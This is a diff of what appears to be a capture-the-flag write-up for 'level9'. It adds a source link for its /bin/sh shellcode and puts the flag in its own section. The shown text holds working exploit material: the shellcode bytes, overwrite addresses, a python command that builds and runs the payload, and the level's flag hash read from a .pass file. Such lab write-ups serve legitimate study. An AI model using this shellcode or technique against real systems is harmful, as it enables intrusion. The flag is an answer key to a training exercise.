@@ -96,9 +96,9 @@ Second address      : `0x804a008 + 8` --> `0x804a010` --> "\x50\x88\x04\x08"
 Segfault's address	: `0x804a078`
 
 
-### exploit
+## exploit
 
-* shellcode : `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
+* shellcode (https://www.exploit-db.com/exploits/42428) : `\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80`
 
 ```shell
 python2.7 -c 'print( "" \
@@ -109,6 +109,11 @@ python2.7 -c 'print( "" \
         )'\
         > /tmp/exploit.txt
 ./level9 $(cat /tmp/exploit.txt)
+```
+
+## flag
+
+```shell
 cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 ```
